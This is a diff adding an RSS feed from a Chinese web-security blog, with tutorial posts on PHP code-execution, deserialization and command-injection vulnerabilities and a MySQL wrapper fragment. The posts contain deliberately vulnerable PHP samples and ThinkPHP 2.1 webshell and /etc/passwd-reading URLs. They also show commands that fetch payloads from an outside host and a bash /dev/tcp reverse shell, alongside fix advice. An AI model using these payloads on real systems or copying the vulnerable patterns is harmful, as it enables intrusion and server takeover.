@@ -1,0 +1,2470 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Php on </title>
+    <link>http://wyb0.com/topics/php/</link>
+    <description>Recent content in Php on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
+    <lastBuildDate>Fri, 14 Oct 2016 13:16:32 +0800</lastBuildDate>
+    <atom:link href="http://wyb0.com/topics/php/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>代码执行漏洞2</title>
+      <link>http://wyb0.com/posts/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E2/</link>
+      <pubDate>Fri, 14 Oct 2016 13:16:32 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E2/</guid>
+      <description>
+
+&lt;p&gt;接着上一篇：&lt;a href=&#34;http://reber-9.com/post/代码执行漏洞/&#34;&gt;http://reber-9.com/post/代码执行漏洞/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x00-函数create-function:f8e479c0998578fbaee1b58d0ce54045&#34;&gt;0x00 函数create_function()&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;php中的函数create_function()可以创建一个匿名函数，其函数原型如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;string create_function ( string $args , string $code )
+其中$args是函数的参数，$code是函数的内容
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;若对提交的code未过滤或过滤不当则可能会导致代码执行漏洞&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x01-示例:f8e479c0998578fbaee1b58d0ce54045&#34;&gt;0x01 示例&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;示例a.php代码如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    $test = @$_GET[&#39;test&#39;];
+    $newfun = create_function(&#39;$a,$b&#39;, $test);
+    $newfun(&#39;1111&#39;,&#39;2222&#39;);
+?&amp;gt;
+上述代码中$nuwfun(&#39;1111&#39;,&#39;2222&#39;)代表此时$a=&#39;1111&#39;,$b=&#39;2222&#39;,然后将其传给$test
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function1.png&#34; alt=&#34;示例1&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function2.png&#34; alt=&#34;示例2&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function3.png&#34; alt=&#34;示例3&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x02-函数assert:f8e479c0998578fbaee1b58d0ce54045&#34;&gt;0x02 函数assert()&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;这个函数和eval()的作用差不多&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php @assert($_GET[&#39;str&#39;]); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_assert.png&#34; alt=&#34;函数assert()&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP反序列化漏洞</title>
+      <link>http://wyb0.com/posts/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Mon, 25 Jul 2016 23:32:52 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</guid>
+      <description>
+
+&lt;h2 id=&#34;这里是正文:27d041f2ed6ee13db4814701975a6a98&#34;&gt;这里是正文&lt;/h2&gt;
+
+&lt;h3 id=&#34;0x00-关于反序列化漏洞:27d041f2ed6ee13db4814701975a6a98&#34;&gt;0x00 关于反序列化漏洞&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;序列化：使用函数serialize()可将实例序列化为字符串&lt;br /&gt;
+反序列化：使用函数unserialize()可将序列化的字符串还原&lt;br /&gt;
+若服务端有如下代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    class foo{
+        public $file = &amp;quot;test.txt&amp;quot;;
+        public $data = &amp;quot;123456&amp;quot;;
+
+        function __destruct(){
+            file_put_contents($this-&amp;gt;file,$this-&amp;gt;data);
+        }
+    }
+
+    $d = $_REQUEST[&#39;str&#39;];
+    var_dump($d);
+    echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;
+    $tc = unserialize(base64_decode($d));
+    var_dump($tc);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;客户端可构造如下代码生成序列化后的字符串提交给服务端，&lt;br /&gt;
+服务端就会生成文件xx.php，内容为&lt;b&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/b&gt;：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    class foo {
+        public $ﬁle = &amp;quot;test.txt&amp;quot;;
+        public $data = &amp;quot;123456&amp;quot;;
+        
+        function __destruct() {
+            ﬁle_put_contents($this-&amp;gt;ﬁle, $this-&amp;gt;data);
+        }
+    }
+
+    $f = new foo();
+    $f-&amp;gt;ﬁle = &amp;quot;xx.php&amp;quot;;
+    $f-&amp;gt;data = &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;;
+    echo base64_encode(serialize($f));
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>代码执行漏洞</title>
+      <link>http://wyb0.com/posts/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Mon, 25 Jul 2016 22:32:51 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
+      <description>
+
+&lt;h3 id=&#34;0x00-代码执行:222e4fd427b5d06b9bd6d5bfab9eeb67&#34;&gt;0x00 代码执行&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，
+没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x01-相关函数:222e4fd427b5d06b9bd6d5bfab9eeb67&#34;&gt;0x01 相关函数&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;PHP：eval assert
+Python：exec
+asp：&amp;lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&amp;gt;
+Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x02-phpcms中的string2array函数:222e4fd427b5d06b9bd6d5bfab9eeb67&#34;&gt;0x02 phpcms中的string2array函数&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;array(  //这个是字符串形式的数组，它并不是数组，而是字符串
+    &#39;upload_maxsize&#39; =&amp;gt; &#39;2048&#39;,
+    &#39;upload_allowext&#39; =&amp;gt; &#39;jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf&#39;, 
+    &#39;watermark_enable&#39; =&amp;gt; &#39;1&#39;,
+    &#39;watermark_minwidth&#39; =&amp;gt; &#39;300&#39;,
+    &#39;watermark_minheight&#39; =&amp;gt; &#39;300&#39;,
+    &#39;watermark_img&#39; =&amp;gt; &#39;/statics/img/water/mark.png&#39;,
+    &#39;watermark_pct&#39; =&amp;gt; &#39;85&#39;,
+    &#39;watermark_quality&#39; =&amp;gt; &#39;80&#39;,
+    &#39;watermark_pos&#39; =&amp;gt; &#39;9&#39;,
+)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function string2array($data) {
+    //这个函数可以将字符串$data转化为数组
+    if($data == &#39;&#39;) 
+        return array(); 
+    @eval(&amp;quot;\$array = $data;&amp;quot;); 
+        return $array;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x03-漏洞危害:222e4fd427b5d06b9bd6d5bfab9eeb67&#34;&gt;0x03 漏洞危害&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;执行代码
+让网站写shell
+甚至控制服务器
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x04-漏洞分类-也是利用点:222e4fd427b5d06b9bd6d5bfab9eeb67&#34;&gt;0x04 漏洞分类(也是利用点)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;执行代码的函数：eval、assert
+callback函数：preg_replace + /e模式
+反序列化：unserialize()(反序列化函数)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x05-漏洞挖掘:222e4fd427b5d06b9bd6d5bfab9eeb67&#34;&gt;0x05 漏洞挖掘&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;框架找漏洞，如ThinkPHP：
+  inurl:index.php intext:ThinkPHP 2.1 { Fast &amp;amp; Simple OOP PHP Framework }
+框架的URL格式如下：
+  Site:Port/Module name/Method name/Property name/Preperty value
+  Site:Port/index.php?m=Module_name&amp;amp;f=Method_name&amp;amp;v=Preperty_value
+  
+  www.xx.com:88/News/show/id/328
+  www.yy.com:99/index.php?m=News&amp;amp;f=detail&amp;amp;item=23
+  www.zz.com/global_cms_contentview_id_2435
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x06-搭建环境实验:222e4fd427b5d06b9bd6d5bfab9eeb67&#34;&gt;0x06 搭建环境实验&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;示例一&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $data = $_GET[&#39;data&#39;];
+    eval(&amp;quot;\$ret = $data;&amp;quot;);
+    echo $ret;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval1.png&#34; alt=&#34;代码执行漏洞使用eval函数1.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;示例二&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $data = $_GET[&#39;data&#39;];
+    eval(&amp;quot;\$ret = strtolower(&#39;$data&#39;);&amp;quot;);
+    echo $ret;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval2.png&#34; alt=&#34;代码执行漏洞使用eval函数2.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;示例三&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $data = $_GET[&#39;data&#39;];
+    eval(&amp;quot;\$ret = strtolower(\&amp;quot;$data\&amp;quot;);&amp;quot;);
+    echo $ret;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval3.png&#34; alt=&#34;代码执行漏洞使用eval函数3.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval4.png&#34; alt=&#34;代码执行漏洞使用eval函数4.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;示例四&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $data = $_GET[&#39;data&#39;];
+    eval(&amp;quot;\$ret = strtolower(\&amp;quot;$data\&amp;quot;);&amp;quot;);
+    echo $ret;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval5.png&#34; alt=&#34;代码执行漏洞使用eval函数5.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_eval6.png&#34; alt=&#34;代码执行漏洞使用eval函数6.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;示例五&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])&lt;br /&gt;
+/e修正符使preg_replace()将replacement参数当作PHP 代码(在适当的逆向引用替换完之后)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $data = $GET_[&#39;data&#39;];
+    // echo $data;
+    preg_replace(&#39;/&amp;lt;data&amp;gt;(.*)&amp;lt;\/data&amp;gt;/e&#39;,&#39;$ret = &amp;quot;\\1&amp;quot;&#39;,$data);
+    echo $ret;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_preg_replace.png&#34; alt=&#34;代码执行漏洞使用preg_replace函数.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x07-具体操作:222e4fd427b5d06b9bd6d5bfab9eeb67&#34;&gt;0x07 具体操作&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;# 一般找CMS相应版本漏洞，如ThinkPHP2.1
+* 一句话
+    http://www.xxx.com/News/detail/id/{${@eval($_POST[aa])}}
+* 得到当前路径
+    http://www.xxx.com/News/detail/id/{${print(getcwd()))}}
+* 读文件
+    http://www.xxx.com/News/detail/id/{${exit(var_dump(file_get_contents($_POST[&#39;f&#39;])))}}
+    POST的数据为：f=/etc/passwd
+* 写shell
+    http://www.xxx.com/News/detail/id/{${exit(var_dump(file_put_contents($_POST[&#39;f&#39;],$_POST[d])))}}
+    POST的数据为：f=1.php&amp;amp;d=&amp;lt;?php @eval($_POST[&#39;aa&#39;])?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x08-漏洞防御:222e4fd427b5d06b9bd6d5bfab9eeb67&#34;&gt;0x08 漏洞防御&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;使用json保存数组，当读取时就不需要使用eval了&lt;/li&gt;
+&lt;li&gt;对于必须使用eval的地方，一定严格处理用户数据&lt;/li&gt;
+&lt;li&gt;字符串使用单引号包括可控代码，插入前使用addslashes转义&lt;/li&gt;
+&lt;li&gt;放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换&lt;/li&gt;
+&lt;li&gt;若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;
+下一篇：&lt;a href=&#34;http://wyb0.com/post/代码执行漏洞2/&#34;&gt;http://wyb0.com/post/代码执行漏洞2/&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>命令执行漏洞</title>
+      <link>http://wyb0.com/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Sun, 24 Jul 2016 14:32:51 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
+      <description>
+
+&lt;h3 id=&#34;0x00-命令执行:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x00 命令执行&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、
+passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令
+拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x01-利用条件:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x01 利用条件&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;应用调用执行系统命令的函数&lt;/li&gt;
+&lt;li&gt;将用户输入作为系统命令的参数拼接到了命令行中&lt;/li&gt;
+&lt;li&gt;没有对用户输入进行过滤或过滤不严&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;0x02-漏洞分类:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x02 漏洞分类&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;代码层过滤不严&lt;br /&gt;
+商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：&lt;br /&gt;
+system(&amp;ldquo;/bin/program --arg $arg&amp;rdquo;);&lt;/li&gt;
+&lt;li&gt;系统的漏洞造成命令执行&lt;br /&gt;
+bash破壳漏洞(CVE-2014-6271)&lt;br /&gt;
+执行&lt;code&gt;env x=&#39;() { :;}; echo vulnerable&#39; bash -c &amp;quot;echo this is a test&amp;quot;&lt;/code&gt;后&lt;br /&gt;
+若输出vulnerable则证明存在漏洞&lt;/li&gt;
+&lt;li&gt;调用的第三方组件存在代码执行漏洞&lt;br /&gt;
+如WordPress中用来处理图片的ImageMagick组件&lt;br /&gt;
+JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)&lt;br /&gt;
+ThinkPHP命令执行&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;0x03-漏洞危害:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x03 漏洞危害&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;继承Web服务程序的权限去执行系统命令或读写文件&lt;/li&gt;
+&lt;li&gt;反弹shell&lt;/li&gt;
+&lt;li&gt;控制整个网站甚至控制服务器&lt;/li&gt;
+&lt;li&gt;进一步内网渗透&lt;/li&gt;
+&lt;li&gt;等等&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;0x04-漏洞挖掘:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x04 漏洞挖掘&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;可以google hacking&lt;br /&gt;
+尝试：filetype:action或filetype:do来找struts2&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x05-漏洞可能代码-以system为例:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x05 漏洞可能代码(以system为例)&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;1. system(&amp;quot;$arg&amp;quot;);  //直接输入即可
+2. system(&amp;quot;/bin/prog $arg&amp;quot;);  //直接输入;ls
+3. system(&amp;quot;/bin/prog -p $arg&amp;quot;);  //和2一样
+4. system(&amp;quot;/bin/prog --p=\&amp;quot;$arg\&amp;quot;&amp;quot;);  //可以输入&amp;quot;;ls;&amp;quot;
+5. system(&amp;quot;/bin/prog --p=&#39;$arg&#39;&amp;quot;);  //可以输入&#39;;ls;&#39;
+
+在Linux上，上面的;也可以用|、||代替
+    ;前面的执行完执行后面的
+    |是管道符，显示后面的执行结果
+    ||当前面的执行出错时执行后面的
+
+在Windows上，不能用;可以用&amp;amp;、&amp;amp;&amp;amp;、|、||代替
+    &amp;amp;前面的语句为假则直接执行后面的
+    &amp;amp;&amp;amp;前面的语句为假则直接出错，后面的也不执行
+    |直接执行后面的语句
+    ||前面出错执行后面的
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x06-漏洞利用:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x06 漏洞利用&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;示例一&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $arg = $_GET[&#39;cmd&#39;];
+    if ($arg) {
+        system(&amp;quot;$arg&amp;quot;);
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/command_execution1.png&#34; alt=&#34;命令执行示例1.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;示例二&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $arg = $_GET[&#39;cmd&#39;];
+    if ($arg) {
+        system(&amp;quot;ping -c 3 $arg&amp;quot;);
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/command_execution2.png&#34; alt=&#34;命令执行示例2.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;示例三&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $arg = $_GET[&#39;cmd&#39;];
+    if ($arg) {
+        system(&amp;quot;ls -al \&amp;quot;$arg\&amp;quot;&amp;quot;);
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/command_execution3.png&#34; alt=&#34;命令执行示例3.png&#34;&gt;
+&lt;/div&gt;
+
+注：若引号被转义，则可以用&lt;b&gt;`id`&lt;/b&gt;来执行&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;示例四&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $arg = $_GET[&#39;cmd&#39;];
+    if ($arg) {
+        system(&amp;quot;ls -al &#39;$arg&#39;&amp;quot;);
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/command_execution4.png&#34; alt=&#34;命令执行示例4.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x07-其他:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x07 其他&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;动态函数调用&lt;br /&gt;
+在cmd.php中的代码如下：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $fun = $_GET[&#39;fun&#39;];
+    $par = $_GET[&#39;par&#39;];
+    $fun($par);
+?&amp;gt;
+
+提交http://localhost/cmd.php?fun=system&amp;amp;par=net user，  
+最终执行的是system(&amp;quot;net user&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x08-关于获取webshell:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x08 关于获取webshell&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;要有写权限！&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;1.得到当前或绝对路径(可以用pwd)
+2.写文件:
+    用?cmd=echo &amp;quot;&amp;lt;?php phpinfo()?&amp;gt;&amp;quot; &amp;gt; /var/www/html/info.php
+    或?cmd=wget -O /var/www/html/info.php http://www.xx.com/phpinfo.txt
+    或?cmd=curl http://www.xx.com/phpinfo.txt &amp;gt; /var/www/html/info.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x09-反弹shell:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x09 反弹shell&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;远程执行nc -vlp 8888
+?cmd=bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8888 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x0a-漏洞修复:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x0A 漏洞修复&lt;/h3&gt;
+
+&lt;ol&gt;
+&lt;li&gt;尽量少用执行命令的函数或者直接禁用&lt;/li&gt;
+&lt;li&gt;参数值尽量使用引号包括&lt;/li&gt;
+&lt;li&gt;在使用动态函数之前，确保使用的函数是指定的函数之一&lt;/li&gt;
+&lt;li&gt;在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $arg = $_GET[&#39;cmd&#39;];
+    // $arg = addslashes($arg);
+    $arg = escapeshellcmd($arg);  //拼接前就处理
+    if ($arg) {
+        system(&amp;quot;ls -al &#39;$arg&#39;&amp;quot;);
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP之封装MySQL类</title>
+      <link>http://wyb0.com/posts/PHP%E4%B9%8B%E5%B0%81%E8%A3%85MySQL%E7%B1%BB/</link>
+      <pubDate>Fri, 03 Jun 2016 11:19:05 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E4%B9%8B%E5%B0%81%E8%A3%85MySQL%E7%B1%BB/</guid>
+      <description>
+
+&lt;h2 id=&#34;config-inc-php内容如下:317ff1eff665d8a9829539f077e44501&#34;&gt;config.inc.php内容如下&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+return array(
+    &#39;DB_HOST&#39; =&amp;gt; &#39;192.168.188.134&#39;,
+    &#39;DB_NAME&#39; =&amp;gt; &#39;scoreboard&#39;, 
+    &#39;DB_USER&#39; =&amp;gt; &#39;score&#39;,
+    &#39;DB_PASS&#39; =&amp;gt; &#39;123456&#39;,
+    &#39;DB_CHARSET&#39; =&amp;gt; &#39;utf8&#39;,
+    &#39;IS_LOG&#39; =&amp;gt; 1,//开启日志
+    &#39;LOGFILEPATH&#39; =&amp;gt; &#39;../log.txt&#39;//日志路径
+);
+/*
+    $database = require(&#39;./config.php&#39;);
+    echo $database[&#39;DB_TYPE&#39;];   //输出&#39;DB_TYPE&#39;
+*/
+
